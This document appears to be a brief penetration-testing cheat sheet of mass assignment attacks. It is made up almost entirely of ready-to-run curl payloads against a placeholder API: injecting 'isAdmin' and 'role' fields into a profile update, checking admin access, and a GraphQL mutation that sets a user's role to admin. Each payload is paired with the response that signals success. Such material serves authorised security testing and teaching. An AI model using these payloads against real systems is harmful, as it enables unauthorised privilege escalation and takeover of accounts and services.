# Mass Assignment - Annotated Examples

## Privilege Field Injection
```bash
curl -s -X PUT https://target.com/api/users/me \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"tester","isAdmin":true,"role":"owner"}'
```
Exploit signal:
```
{"id":"123","name":"tester","role":"owner","isAdmin":true}
```

## Verify Privileged Capability
```bash
curl -i https://target.com/api/admin/users \
  -H "Authorization: Bearer $TOKEN"
```
Exploit signal:
```
HTTP/1.1 200 OK
```

## GraphQL Mutation Injection
```bash
curl -s https://target.com/graphql \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { updateUser(input:{displayName:\"x\",role:\"admin\"}) { id role } }"}'
```
Exploit signal:
```
{"data":{"updateUser":{"id":"123","role":"admin"}}}
```
